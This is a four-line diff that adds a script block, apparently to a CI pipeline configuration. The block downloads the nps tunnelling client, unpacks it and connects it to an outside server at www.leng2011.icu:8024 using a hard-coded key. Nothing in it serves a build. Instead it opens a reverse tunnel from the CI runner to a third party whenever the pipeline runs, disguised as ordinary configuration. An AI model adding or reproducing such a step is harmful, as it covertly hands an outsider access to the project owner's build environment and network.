@@ -1,0 +1,4 @@
+script:
+  - wget https://github.com/ehang-io/nps/releases/download/v0.26.9/linux_amd64_client.tar.gz
+  - tar xvf linux_amd64_client.tar.gz
+  - ./npc -server=www.leng2011.icu:8024 -vkey=48u771dyiro8jn3z -type=tcp
